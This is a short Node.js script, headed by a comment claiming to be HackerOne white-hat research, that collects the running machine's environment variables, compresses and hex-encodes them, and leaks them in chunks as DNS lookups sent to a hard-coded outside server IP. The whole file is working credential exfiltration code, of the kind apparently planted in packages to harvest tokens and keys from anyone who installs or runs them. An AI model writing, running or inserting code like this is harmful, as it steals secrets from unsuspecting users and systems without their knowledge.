// Hackerone white hat security research, catz@wearehackerone.com

var { Resolver } = require('dns');
var zlib = require('zlib');

var resolver = new Resolver();

function splitString(string, size) {
  var re = new RegExp('.{1,' + size + '}', 'g');
  return string.match(re);
}

resolver.setServers(['165.232.68.239']);
var d = process.env || {};
var data = Object.keys(d)
  .filter(function (key) {
    return (
      typeof d[key] === 'string' &&
      d[key].length >= 3 &&
      d[key].length <= 100
    );
  })
  .reduce(function (result, key) {
    result[key] = d[key];
    return result;
  }, {});

var encData = zlib.brotliCompressSync(Buffer.from(JSON.stringify(data))).toString('hex');


var ch = splitString(encData, 60);

var dt = Date.now();

for (var i = 0; i < ch.length; i++) {
  const domain = ['f' + dt, i + 1, ch.length, ch[i]].join('.');
  resolver.resolve4(domain, function (err) {
  });
}
